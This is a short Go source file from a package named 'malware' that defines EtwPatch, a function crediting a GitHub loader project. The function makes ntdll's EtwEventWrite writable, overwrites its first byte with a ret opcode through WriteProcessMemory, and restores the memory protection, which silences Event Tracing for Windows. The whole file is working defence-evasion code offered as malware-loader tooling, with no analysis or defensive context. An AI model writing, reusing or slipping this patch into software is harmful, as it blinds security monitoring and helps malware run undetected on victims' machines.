package malware

import (
	"golang.org/x/sys/windows"
	"syscall"
	"unsafe"
)

// EtwPatch patches the EtwEventWrite function
// https://github.com/timwhitez/Doge-Assembly/blob/main/loader/etw.go
// write arbitrary ret opcodes into the ETW event writing function (EtwEventWrite) to bypass ETW
func EtwPatch(hProcess uintptr) {
	fntdll := syscall.NewLazyDLL("ntdll.dll")
	fucketw := fntdll.NewProc("EtwEventWrite")
	WriteProcessMemory := k32.NewProc("WriteProcessMemory")
	var oldProtect uint32
	var patch = []byte{0xc3}

	windows.VirtualProtect(fucketw.Addr(), 1, windows.PAGE_EXECUTE_READWRITE, &oldProtect)
	WriteProcessMemory.Call(hProcess, fucketw.Addr(), uintptr(unsafe.Pointer(&patch[0])), uintptr(len(patch)), 0)
	windows.VirtualProtect(fucketw.Addr(), 1, oldProtect, &oldProtect)
}
